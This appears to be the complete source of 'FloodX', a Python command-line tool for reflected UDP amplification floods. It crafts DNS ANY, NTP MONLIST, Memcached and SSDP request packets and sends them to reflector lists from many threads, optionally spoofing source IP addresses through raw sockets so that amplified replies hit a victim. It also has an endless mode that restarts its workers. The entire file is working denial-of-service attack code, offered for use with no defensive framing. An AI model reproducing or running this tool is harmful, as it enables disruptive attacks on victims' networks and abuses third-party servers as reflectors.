#!/usr/bin/env python3
"""
FloodX: High-Performance UDP Amplification Toolkit
Supports DNS, NTP, Memcached, SSDP amplifiers with dynamic reflector lists & optional IP spoofing.
"""
import argparse
import socket
import struct
import random
import threading
import time
import ipaddress
import sys
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("UdpAmplifier")

class UdpAmplifier:
    def __init__(self, reflectors, protocols, duration, threads, spoof_cidrs=None, delay=0.0):
        self.reflectors = self._load_reflectors(reflectors)
        self.protocols = protocols
        self.duration = duration
        self.threads = threads
        self.spoof_cidrs = self._load_spoof_cidrs(spoof_cidrs)
        self.delay = delay
        self.running = False
        self.stats = { 'packets': 0, 'bytes': 0, 'errors': 0 }

    def _load_reflectors(self, path):
        lst = []
        with open(path) as f:
            for line in f:
                host, port = line.strip().split(":")
                lst.append((host, int(port)))
        logger.info(f"Loaded {len(lst)} reflectors from {path}")
        return lst

    def _load_spoof_cidrs(self, path):
        cidrs = []
        if not path:
            return cidrs
        with open(path) as f:
            for line in f:
                cidrs.append(ipaddress.ip_network(line.strip()))
        logger.info(f"Loaded {len(cidrs)} spoof CIDR ranges from {path}")
        return cidrs

    def _random_spoof_ip(self):
        if not self.spoof_cidrs:
            return None
        net = random.choice(self.spoof_cidrs)
        addr = random.randint(int(net.network_address), int(net.broadcast_address))
        return str(ipaddress.IPv4Address(addr))

    def _build_payload(self, proto):
        if proto == 'dns':
            # Standard DNS ANY query for amplification
            qname = f"{random.randint(1,99999)}.example.com"
            q = b''
            # header: ID, flags, QD=1
            q += struct.pack('>H', random.getrandbits(16)) + b'\x01\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00'
            for label in qname.split('.'):
                q += bytes([len(label)]) + label.encode()
            q += b'\x00'  # end
            q += b'\x00\xFF\x00\x01'  # Type=ANY, Class=IN
            return q
        elif proto == 'ntp':
            # NTP MONLIST request packet
            return b'\x17\x00\x03\x2A' + b'\x00'*4
        elif proto == 'memcached':
            return b'stats\r\n'
        elif proto == 'ssdp':
            return (
                b'M-SEARCH * HTTP/1.1\r\n'
                b'HOST:239.255.255.250:1900\r\n'
                b'MAN:"ssdp:discover"\r\n'
                b'MX:1\r\n'
                b'ST:ssdp:all\r\n\r\n'
            )
        else:
            # raw random
            return random.getrandbits(1024).to_bytes(128, 'little', signed=False)

    def _send_worker(self, proto):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if self.spoof_cidrs:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        payload = self._build_payload(proto)
        pkt_len = len(payload)
        
        if self.duration > 0:
            # Duration-based mode
            end_time = time.time() + self.duration
            while self.running and time.time() < end_time:
                for host, port in self.reflectors:
                    try:
                        if self.spoof_cidrs:
                            src = self._random_spoof_ip()
                            # build IP header manually
                            ip_header = self._build_ip_header(src, host)
                            udp_header = self._build_udp_header(random.randint(1024,65535), port, payload)
                            raw.sendto(ip_header + udp_header + payload, (host, port))
                            self.stats['bytes'] += len(ip_header) + len(udp_header) + pkt_len
                        else:
                            sock.sendto(payload, (host, port))
                            self.stats['bytes'] += pkt_len
                        self.stats['packets'] += 1
                    except Exception:
                        self.stats['errors'] += 1
                if self.delay:
                    time.sleep(self.delay)
        else:
            # Endless mode - run until interrupted
            while self.running:
                for host, port in self.reflectors:
                    if not self.running:  # Check if stopped
                        break
                    try:
                        if self.spoof_cidrs:
                            src = self._random_spoof_ip()
                            # build IP header manually
                            ip_header = self._build_ip_header(src, host)
                            udp_header = self._build_udp_header(random.randint(1024,65535), port, payload)
                            raw.sendto(ip_header + udp_header + payload, (host, port))
                            self.stats['bytes'] += len(ip_header) + len(udp_header) + pkt_len
                        else:
                            sock.sendto(payload, (host, port))
                            self.stats['bytes'] += pkt_len
                        self.stats['packets'] += 1
                    except Exception:
                        self.stats['errors'] += 1
                if self.delay:
                    time.sleep(self.delay)
        sock.close()

    def _build_ip_header(self, src, dst):
        # Minimal IPv4 header for raw socket
        src_ip = socket.inet_aton(src)
        dst_ip = socket.inet_aton(dst)
        ver_ihl = (4 << 4) + 5
        tos = 0
        tot_len = 20 + 8  # IP + UDP header
        id = random.getrandbits(16)
        frag = 0
        ttl = 64
        proto = socket.IPPROTO_UDP
        checksum = 0
        header = struct.pack('>BBHHHBBH4s4s', ver_ihl, tos, tot_len, id, frag, ttl, proto, checksum, src_ip, dst_ip)
        # compute checksum
        checksum = self._ip_checksum(header)
        return struct.pack('>BBHHHBBH4s4s', ver_ihl, tos, tot_len, id, frag, ttl, proto, checksum, src_ip, dst_ip)

    def _build_udp_header(self, src_port, dst_port, payload):
        length = 8 + len(payload)
        checksum = 0
        return struct.pack('>HHHH', src_port, dst_port, length, checksum)

    def _ip_checksum(self, data):
        s = sum(struct.unpack('>HHHHHHHH', data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def start(self):
        self.running = True
        threads = []
        for proto in self.protocols:
            for _ in range(self.threads):
                t = threading.Thread(target=self._send_worker, args=(proto,), daemon=True)
                t.start()
                threads.append(t)
        start = time.time()
        
        # Run for specified duration or endless if duration is 0
        if self.duration > 0:
            # Duration-based mode
            while time.time() - start < self.duration:
                time.sleep(1)
                logger.info(
                    f"Sent={self.stats['packets']} pkts  "
                    f"{self.stats['bytes']/1024:.1f}KB  Err={self.stats['errors']}"
                )
        else:
            # Endless mode - run until interrupted
            logger.info("🔄 Running in endless mode - Ctrl+C to stop")
            try:
                while self.running:
                    time.sleep(30)  # Report every 30 seconds
                    logger.info(
                        f"UDP Amplifier - Sent={self.stats['packets']} pkts  "
                        f"{self.stats['bytes']/1024:.1f}KB  Err={self.stats['errors']}"
                    )
                    
                    # Restart threads if they died (continuous operation)
                    alive_threads = [t for t in threads if t.is_alive()]
                    if len(alive_threads) < len(threads) * 0.5:
                        logger.info("🔄 Restarting UDP workers for continuous operation...")
                        
                        # Start new threads to replace dead ones
                        for proto in self.protocols:
                            for _ in range(self.threads):
                                if len([t for t in threads if t.is_alive()]) < len(threads):
                                    t = threading.Thread(target=self._send_worker, args=(proto,), daemon=True)
                                    t.start()
                                    threads.append(t)
            except KeyboardInterrupt:
                logger.info("🛑 Endless UDP amplifier stopped by user")
                self.running = False
        self.running = False
        for t in threads:
            t.join()
        logger.info("Attack complete.")


def main():
    parser = argparse.ArgumentParser(description="FloodX UDP Amplifier")
    parser.add_argument("--reflectors", required=True, help="Reflector list file (ip:port per line)")
    parser.add_argument("--protocols", nargs='+', default=['dns'], choices=['dns','ntp','memcached','ssdp'],
                        help="Amplification protocols to use")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=5, help="Threads per protocol")
    parser.add_argument("--spoof", help="CIDR file for source IP spoofing")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between loops in seconds")
    args = parser.parse_args()

    amp = UdpAmplifier(
        reflectors=args.reflectors,
        protocols=args.protocols,
        duration=args.duration,
        threads=args.threads,
        spoof_cidrs=args.spoof,
        delay=args.delay 
    )
    amp.start() # amp.join()

if __name__ == "__main__":
    main()
